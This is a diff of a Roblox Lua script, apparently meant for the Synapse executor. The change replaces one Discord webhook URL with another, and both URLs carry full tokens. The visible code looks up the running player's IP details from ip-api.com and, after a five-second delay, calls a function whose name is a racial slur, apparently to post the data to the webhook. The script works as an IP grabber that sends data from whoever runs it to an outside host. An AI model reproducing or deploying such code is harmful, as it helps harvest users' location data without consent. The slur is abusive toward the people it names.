@@ -1,5 +1,5 @@
 local player = game:GetService("Players").LocalPlayer
-local webhook_url = "https://discord.com/api/webhooks/1297487440130605096/Uxo6P9qlGKBFp0_kPMSQJKvgaw3d2mXw-RTBGN5DCbhHydvjFC0udZ0oPmWxkqQZdKMJ"
+local webhook_url = "https://discord.com/api/webhooks/1297758032964485151/ZswSloK2xvXezCMlvyvg80LeRYd4m45orVSPNlWCRIdL_IheMcD9jeonp6KsjXyNo8Qy"
 local ip_info = syn.request({
     Url = "http://ip-api.com/json",
     Method = "GET"
@@ -40,4 +40,4 @@ end
 -- Delayed execution of the webhook and print message after 5 seconds
 delay(5, function()
     getfuckednigga()
-end)
+end) 
